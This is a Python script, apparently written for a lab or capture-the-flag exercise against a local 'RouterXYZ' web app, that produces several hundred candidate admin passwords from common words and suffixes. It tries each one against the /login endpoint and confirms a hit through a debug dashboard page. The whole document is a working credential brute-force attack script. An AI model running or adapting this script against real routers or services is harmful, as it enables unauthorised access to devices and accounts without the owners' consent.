import requests
base='http://localhost:80'
user='admin'
# Build a small but richer candidate list
words=['admin','router','xyz','RouterXYZ','routerxyz','xyzrouter','wifi','network','passwd','password','secret','secr3t','s3cr3t','super','supersecret','superuser','root','toor','qwerty','letmein','welcome','default','changeme','p@ssw0rd','P@ssw0rd','P@ssword','Admin@123','Adm1n123','Admin123!','Admin123','Admin2024','Admin2025','Admin2026','router123','router2026','xyz123','xyz2026','wifi123','wifi2026']
nums=['','1','12','123','1234','12345','2024','2025','2026','!','!1','@123','@2026','@']
cands=set()
for w in words:
    cands.add(w)
    for n in nums:
        cands.add(w+n)
        cands.add(w.capitalize()+n)
        cands.add(w.upper()+n)
# Some combos
for pre in ['','admin','Admin','ADM','root','router','xyz']:
    for suf in ['','123','1234','2026','@123','!']:
        if pre:
            cands.add(pre+'password'+suf)
            cands.add(pre+'pass'+suf)
            cands.add(pre+'router'+suf)

def try_login(pw):
    s=requests.Session()
    r=s.post(base+'/login', data={'username':user,'password':pw}, allow_redirects=False, timeout=5)
    if r.status_code==302 and r.headers.get('Location','').startswith('/dashboard'):
        dbg=s.get(base+'/dashboard?debug=1', timeout=5).text
        if 'username&#39;: &#39;admin' in dbg:
            return True,pw
    return False,None

for i,pw in enumerate(sorted(cands, key=len)):
    ok,found=try_login(pw)
    if ok:
        print('SUCCESS', found)
        break
    if i%100==0:
        print('Tried', i)
else:
    print('NO MATCH, tried', len(cands))
